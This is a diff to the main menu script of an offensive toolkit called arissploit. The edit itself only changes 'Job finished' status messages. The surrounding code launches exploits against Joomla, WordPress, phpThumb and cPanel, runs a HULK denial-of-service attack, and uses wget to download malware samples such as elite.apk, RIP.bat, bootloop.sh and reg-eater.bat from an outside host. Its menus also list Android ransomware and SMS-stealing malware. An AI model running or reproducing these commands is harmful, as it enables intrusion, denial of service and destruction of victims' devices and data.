@@ -233,7 +233,7 @@ def main():
 	elif dr == "use exploit/android/remote_access":
 		print ""+N+"=>"+R+" Now you can enter key 'show options'"
 		os.system("cd modules;cd android;python android.py")
-		print ""+B+"[*] "+N+"Job finished..."
+		print ""+B+"[*] "+N+"Job finished!"
 		print
 		main()
 	elif dr == "use exploit/power_dos":
@@ -242,7 +242,7 @@ def main():
 		run = raw_input(""+N+"(console)> ("+R+"power_dos"+N+"): ")
 		if run == "run":
 			os.system("cd modules;cd hulk_attacks;python hulk.py %s" % (target))
-			print ""+B+"[*]"+N+" Job finished"
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 	elif dr == "use exploit/php_thumb_shell_upload":
@@ -254,7 +254,7 @@ def main():
 			time.sleep(2)
 			print ""+B+"[*] "+N+"Starting attacks..."
 			os.system("cd modules;cd exploit_phpthumb;perl rcexploit.pl %s" % (list))
-			print ""+B+"[*]"+N+" Job finished"
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 	elif dr == "use exploit/cpanel_bruteforce":
@@ -278,7 +278,7 @@ def main():
 			time.sleep(2)
 			print ""+B+"[*] "+N+"Starting attacks..."
 			os.system("cd modules;cd cpanel;perl cpanel.pl %s %s %s %s %s" % (vc,usr,port,pss,pas))
-			print ""+B+"[*]"+N+" Job finished"
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 	elif dr == "use exploit/joomla_com_hdflayer":
@@ -293,7 +293,7 @@ def main():
 		if r == "run":
 			print ""+B+"[*] "+N+"Starting attacks..."
 			os.system("cd modules;cd exploit_joomla;python exploitjoomla.py -t %s -f %s" % (t,f))
-			print ""+B+"[*]"+N+" Job finished"
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 	elif dr == "use exploit/wp_symposium_shell_upload":
@@ -308,7 +308,7 @@ def main():
 		if ru == "run":
 			print ""+B+"[*] "+N+"Starting attacks..."
 			os.system("cd modules;cd prestashop;python wp-symposium.py -t %s -f %s" % (vc,fl))
-			print ""+B+"[*]"+N+" Job finished"
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 	elif dr == "use exploit/jm_auto_change_pswd":
@@ -323,7 +323,7 @@ def main():
 		if y == "run":
 			print ""+B+"[*] "+N+"Starting attacks..."
 			os.system("cd modules;cd autoriset_joomla0day;perl joomlariset.pl %s %s" % (er,pa))
-			print ""+B+"[*]"+N+" Job finished"
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 	elif dr == "use exploit/joomla_com_foxcontact":
@@ -339,7 +339,7 @@ def main():
 			time.sleep(1)
 			print ""+B+"["+R+"*"+B+"]"+N+" Starting attacks..."
 			os.system("cd modules;cd com_foxcontact;python exploit.py --url %s --cid %s" % (ts,cid))
-			print ""+B+"[*]"+N+" Job finished..."
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 	elif dr == "use exploit/joomla0day_com_myngallery":
@@ -350,12 +350,12 @@ def main():
 			time.sleep(1)
 			print ""+B+"[*] "+N+"Starting attacks..."
 			os.system("cd modules;cd jom0;perl 0day.pl %s" % (ft))
-			print ""+B+"[*]"+N+" Job finished"
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 	elif dr == "use exploit/joomla_simple_shell":
 		os.system("cd modules;cd joomla_ex;python joomla.py")
-		print ""+B+"[*]"+N+" Job finished"
+		print ""+B+"[*]"+N+" Job finished!"
 		print
 		main()
 			
@@ -373,12 +373,12 @@ def main():
 		if android == "run":
 			time.sleep(1)
 			print
-			print ""+B+"[*] "+N+"Downloading virus.."
+			print ""+B+"[*] "+N+"Downloading virus..."
 			time.sleep(1)
 			os.system("cd virus;mkdir elite;cd elite;wget http://zumizec-com.waper.co/files/elite.apk")
 			print
 			print "Now check folder Virus on "+R+"arissploit/virus/elite/"+N+""
-			print ""+B+"[*]"+N+" Job finished..."
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 	elif dr == "make virus/on_windows_rip":
@@ -388,7 +388,7 @@ def main():
 			os.system("cd virus;mkdir RIP;cd RIP;wget http://zumizec-com.waper.co/files/rip.txt;mv rip.txt RIP.bat")
 			print
 			print "Now check folder virus on "+R+"arissploit/virus/RIP/"
-			print ""+B+"[*]"+N+" Job finished..."
+			print ""+B+"[*]"+N+" Job finished!"
 			main()
 	elif dr == "make virus/on_windows_cut":
 			gl = raw_input(""+N+"(console)> ("+R+"on_windows_cut"+N+"): ")
@@ -398,7 +398,7 @@ def main():
 				print
 				print "Now check folder virus on "+R+"arissploit/virus/cut/"
 				time.sleep(1)
-				print ""+B+"[*]"+N+" Job finished..."
+				print ""+B+"[*]"+N+" Job finished!"
 				print
 				main()
 	elif dr == "make virus/on_macosx_trnd":
@@ -410,7 +410,7 @@ def main():
 			print
 			print "Now check folder virus on "+R+"arissploit/virus/TRINOIDS/"
 			time.sleep(1)
-			print ""+B+"[*]"+N+" Job finished..."
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 	elif dr == "make virus/on_macosx_nthg":
@@ -422,7 +422,7 @@ def main():
 			print
 			print "Now check folder virus on "+R+"arissploit/virus/NOTHING/"
 			time.sleep(1)
-			print ""+B+"[*]"+N+" Job finished..."
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 	elif dr == "make virus/on_windows_alay":
@@ -434,7 +434,7 @@ def main():
 			print
 			print "now check folder virus on"+R+" arissploit/virus/alay/"
 			time.sleep(1)
-			print ""+B+"[*]"+N+" Job finished"
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 	elif dr == "make virus/on_android_boot":
@@ -446,7 +446,7 @@ def main():
 			os.system("cd virus;mkdir bootloop;cd bootloop;wget http://zumizec-com.waper.co/files/bootloop.txt;mv bootloop.txt bootloop.sh")
 		        print "Now check folder virus on "+R+"arissploit/virus/bootloop/"
 		        time.sleep(1)
-		        print (""+B+"[*]"+N+" Job finished..")
+		        print (""+B+"[*]"+N+" Job finished!")
 		        print
 		        main()
 	elif dr == "make virus/on_android_zip":
@@ -457,7 +457,7 @@ def main():
 			time.sleep(1)
 			print
 			print "Now check folder virus on"+R+" arissploit/virus/zipbomb/"
-			print ""+B+"[*]"+N+" Job finished..."
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 	elif dr == "make virus/on_windows_caps":
@@ -469,7 +469,7 @@ def main():
 		print
 		print "Now check folder virus on"+R+" arissploit/virus/capslock/"
 		time.sleep(1)
-		print ""+B+"[*]"+N+" Job finished..."
+		print ""+B+"[*]"+N+" Job finished!"
 		print
 		main()
 	elif dr == "make virus/on_windows_quiz":
@@ -481,7 +481,7 @@ def main():
 			print
 			print "Now check folder virus on "+R+"arissploit/virus/quiz/"
 			time.sleep(1)
-			print ""+B+"[*]"+N+" Job finished..."
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 	elif dr == "make virus/on_windows_dat":
@@ -493,7 +493,7 @@ def main():
 			print
 			print "Now check folder virus on "+R+"arissploit/virus/windows-dat/"
 			time.sleep(1)
-			print ""+B+"[*]"+N+" Job finished..."
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 	elif dr == "make virus/on_windows_ugly":
@@ -505,7 +505,7 @@ def main():
 			print
 			print "Now check folder virus on "+R+"arissploit/virus/ugly/"
 			time.sleep(1)
-			print ""+B+"[*]"+N+" Job finished..."
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 	elif dr == "make virus/on_android_frz":
@@ -517,19 +517,19 @@ def main():
 			print
 			print "Now check folder virus on"+R+" arissploit/virus/freeze/"
 			time.sleep(1)
-			print ""+B+"[*]"+N+" Job finished..."
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 	elif dr == "make virus/on_windows_dea":
 		dead = raw_input(""+N+"(console)> ("+R+"on_windows_dea"+N+"): ")
 		if dead == "run":
 			time.sleep(1)
-			print ""+B+"[*]"+N+"downloading virus..."
+			print ""+B+"[*]"+N+" Downloading virus..."
 			os.system("cd virus;mkdir windows-data-eater;cd windows-data-eater;wget http://zumizec-com.waper.co/files/reg-eater.txt;mv reg-eater.txt reg-eater.bat")
 			print
 			print "Now check folder virus on "+R+"arissploit/virus/windows-data-eater/"
 			time.sleep(1)
-			print ""+B+"[*]"+N+" Job finished..."
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 	elif dr == "make virus/on_windows_cmd":
@@ -541,7 +541,7 @@ def main():
 			print
 			print "Now check folder virus on "+R+"arissploit/virus/cmd/"
 			time.sleep(1)
-			print ""+B+"[*]"+N+" Job finished..."
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 	elif dr == "make virus/on_android_dea":
@@ -554,7 +554,7 @@ def main():
 			print
 			print "Now check folder virus on "+R+"arissploit/virus/data-eater/"
 			time.sleep(1)
-			print ""+B+"[*]"+N+" Job finished"
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 			
@@ -572,7 +572,7 @@ def main():
 			print
 			print "Now check folder virus on "+R+"arissploit/virus/andrograve/"
 			time.sleep(1)
-			print ""+B+"[*]"+N+" Job finished"
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 	elif dr == "make virus/on_android_androrm":
@@ -585,7 +585,7 @@ def main():
 			print
 			print "Now check folder virus on "+R+"arissploit/virus/android-ransomware/"
 			time.sleep(1)
-			print ""+B+"[*]"+N+" Job finished"
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 	elif dr == "make virus/on_android_androrw":
@@ -598,7 +598,7 @@ def main():
 			print
 			print "Now check folder virus on "+R+"arissploit/virus/androidrw/"
 			time.sleep(1)
-			print ""+B+"[*]"+N+" Job finished"
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 	elif dr == "make virus/on_android_gokernel":
@@ -611,7 +611,7 @@ def main():
 			print
 			print "Now check folder virus on "+R+"arissploit/virus/google-kernel/"
 			time.sleep(1)
-			print ""+B+"[*]"+N+" Job finished"
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 	elif dr == "make virus/on_android_gps":
@@ -624,7 +624,7 @@ def main():
 			print
 			print "Now check folder virus on "+R+"arissploit/virus/gps/"
 			time.sleep(1)
-			print ""+B+"[*]"+N+" Job finished"
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 	elif dr == "make virus/on_android_legacy":
@@ -637,7 +637,7 @@ def main():
 			print
 			print "Now check folder virus on "+R+"arissploit/virus/legacy/"
 			time.sleep(1)
-			print ""+B+"[*]"+N+" Job finished"
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 	elif dr == "make virus/on_windows_broken":
@@ -650,7 +650,7 @@ def main():
 			print
 			print "Now check folder virus on "+R+"arissploit/virus/broken/"
 			time.sleep(1)
-			print ""+B+"[*]"+N+" Job finished"
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 	elif dr == "make virus/on_android_rans":
@@ -663,7 +663,7 @@ def main():
 			print
 			print "Now check folder virus on "+R+"arissploit/virus/rans/"
 			time.sleep(1)
-			print ""+B+"[*]"+N+" Job finished"
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 	elif dr == "make virus/on_android_rf":
@@ -676,7 +676,7 @@ def main():
 			print
 			print "Now check folder virus on "+R+"arissploit/virus/rf/"
 			time.sleep(1)
-			print ""+B+"[*]"+N+" Job finished"
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 	elif dr == "make virus/on_android_wana_decp":
@@ -689,7 +689,7 @@ def main():
 			print
 			print "Now check folder virus on "+R+"arissploit/virus/Wannadecryptor/"
 			time.sleep(1)
-			print ""+B+"[*]"+N+" Job finished"
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 	elif dr == "make virus/on_android_wanadecryptor2":
@@ -702,7 +702,7 @@ def main():
 			print
 			print "Now check folder virus on "+R+"arissploit/virus/Wannadecryptor2/"
 			time.sleep(1)
-			print ""+B+"[*]"+N+" Job finished"
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 	elif dr == "make virus/on_android_dangerous_malware":
@@ -715,7 +715,7 @@ def main():
 			print
 			print "Now check folder virus on "+R+"arissploit/virus/dangerous-malware/"
 			time.sleep(1)
-			print ""+B+"[*]"+N+" Job finished"
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 	elif dr == "make virus/on_android_malware":
@@ -728,7 +728,7 @@ def main():
 			print
 			print "Now check folder virus on "+R+"arissploit/virus/malware/"
 			time.sleep(1)
-			print ""+B+"[*]"+N+" Job finished"
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 			
@@ -746,7 +746,7 @@ def main():
 			print
 			print "Now check folder virus on "+R+"arissploit/virus/dangerous-malware/"
 			time.sleep(1)
-			print ""+B+"[*]"+N+" Job finished"
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 			
@@ -763,7 +763,7 @@ def main():
 			print
 			print "Now check folder virus on "+R+"arissploit/virus/malware/"
 			time.sleep(1)
-			print ""+B+"[*]"+N+" Job finished"
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 			
@@ -780,7 +780,7 @@ def main():
 			print
 			print "Now check folder virus on "+R+"arissploit/virus/malware_enc/"
 			time.sleep(1)
-			print ""+B+"[*]"+N+" Job finished"
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 			
@@ -796,7 +796,7 @@ def main():
 			print
 			print "Now check folder virus on "+R+"arissploit/virus/malware_bnews/"
 			time.sleep(1)
-			print ""+B+"[*]"+N+" Job finished"
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 			
@@ -812,7 +812,7 @@ def main():
 			print
 			print "Now check folder virus on "+R+"arissploit/virus/malware_at/"
 			time.sleep(1)
-			print ""+B+"[*]"+N+" Job finished"
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 			
@@ -828,7 +828,7 @@ def main():
 			print
 			print "Now check folder virus on "+R+"arissploit/virus/trojan_malware/"
 			time.sleep(1)
-			print ""+B+"[*]"+N+" Job finished"
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 			
@@ -842,7 +842,7 @@ def main():
 			print
 			print "Now check folder virus on "+R+"arissploit/virus/brother/"
 			time.sleep(1)
-			print ""+B+"[*]"+N+" Job finished"
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 			
@@ -858,7 +858,7 @@ def main():
 			print
 			print "Now check folder virus on "+R+"arissploit/virus/mcef/"
 			time.sleep(1)
-			print ""+B+"[*]"+N+" Job finished"
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 			
@@ -874,7 +874,7 @@ def main():
 			print
 			print "Now check folder virus on "+R+"arissploit/virus/sms_tief/"
 			time.sleep(1)
-			print ""+B+"[*]"+N+" Job finished"
+			print ""+B+"[*]"+N+" Job finished!"
 			main()
 			
 			#############
@@ -883,7 +883,7 @@ def main():
 			
 	elif dr == "use scanner/usr_pro_wordpress_auto_find":
 		os.system("cd modules;cd usr_pro_wordpress_auto_find;python userpro.py")
-		print ""+B+"[*]"+N+" Job finished"
+		print ""+B+"[*]"+N+" Job finished!"
 		print
 		main()
 	elif dr == "use scanner/cms_war":
@@ -895,7 +895,7 @@ def main():
 		if gay == "run":
 			print ""+B+"[*]"+N+" Starting attacks..."
 			os.system("cd modules;cd scanner;python scanner.py %s -m %s" % (tops,ray))
-			print ""+B+"[*]"+N+" Job finished..."
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 	elif dr == "use scanner/wordpress_user_scan":
@@ -905,7 +905,7 @@ def main():
 		if uiop == "run":
 			print ""+B+"[*]"+N+" Starting attacks..."
 			os.system("cd modules;cd wscan;python wpscanner.py -s %s -n %s" % (wop,enum))
-			print ""+B+"[*]"+N+" Job finished..."
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 	elif dr == "use scanner/dir_search":
@@ -916,7 +916,7 @@ def main():
 		dih = raw_input("(console)> ("+R+"dir_search"+N+"): ")
 		if dih == "run":
 			os.system("cd modules;cd dirsearch;python3 dirsearch.py -u %s -e %s" % (ym,puki))
-			print ""+B+"[*]"+N+" Job finished..."
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 	elif dr == "use scanner/lfi_scanners":
@@ -924,12 +924,12 @@ def main():
 		time.sleep(2)
 		print ""+B+"[*] "+N+"Starting attacks..."
 		os.system("cd modules;cd lfi_scanners;perl lfi_scanner.pl")
-		print ""+B+"[*]"+N+" Job finished"
+		print ""+B+"[*]"+N+" Job finished!"
 		print
 		main()
 	elif dr == "use scanner/port_scanners":
 		os.system("python modules/port_scanners/port.py")
-		print ""+B+"[*]"+N+" Job finished"
+		print ""+B+"[*]"+N+" Job finished!"
 		print
 		main()
 	elif dr == "use scanner/joomla_sqli_scanners":
@@ -949,7 +949,7 @@ def main():
 		if rup == "run":
 			print ""+B+"[*]"+N+" Starting Attacks..."
 			os.system("cd modules;cd joomscan_v4;python scan.py %s" % (ops))
-			print ""+B+"[*]"+N+" Job finished"
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 	elif dr == "use scanner/joomla_scanners_v3":
@@ -960,7 +960,7 @@ def main():
 			time.sleep(2)
 			print ""+B+"[*]"+N+" Starting attacks..."
 			os.system("cd modules;cd joomscan_v3;python joomlascanner.py %s" % (x))
-			print ""+B+"[*]"+N+" Job finished"
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 	elif dr == "use scanner/joomla_scanners_v.2":
@@ -969,7 +969,7 @@ def main():
 		o = raw_input(""+N+"(console)> ("+R+"joomla_scanners_v.2"+N+"): ")
 		if o == "run":
 			os.system("cd modules;cd joomscan_v2;python joomlascan2.py %s" % (p))
-			print ""+B+"[*]"+N+" Job finished"
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 	elif dr == "use scanner/joomla_vulnerability_scanners":
@@ -978,7 +978,7 @@ def main():
 			time.sleep(2)
 			print ""+B+"[*]"+N+" Starting attacks..."
 			os.system("cd modules;cd joomscan;perl joomlavulnerability.pl")
-			print ""+B+"[*]"+N+" Job finished"
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 	elif dr == "use scanner/jdownloads_scanners":
@@ -990,7 +990,7 @@ def main():
 		if ruu == "run":
 			print ""+B+"[*]"+N+" Starting attacks..."
 			os.system("cd modules;cd jdownloads_scanner;perl jdownloads_scanner.pl %s" % (li))
-			print ""+B+"[*]"+N+" Job finished"
+			print ""+B+"[*]"+N+" Job finished!"
 			print
 			main()
 	elif dr == "exit":
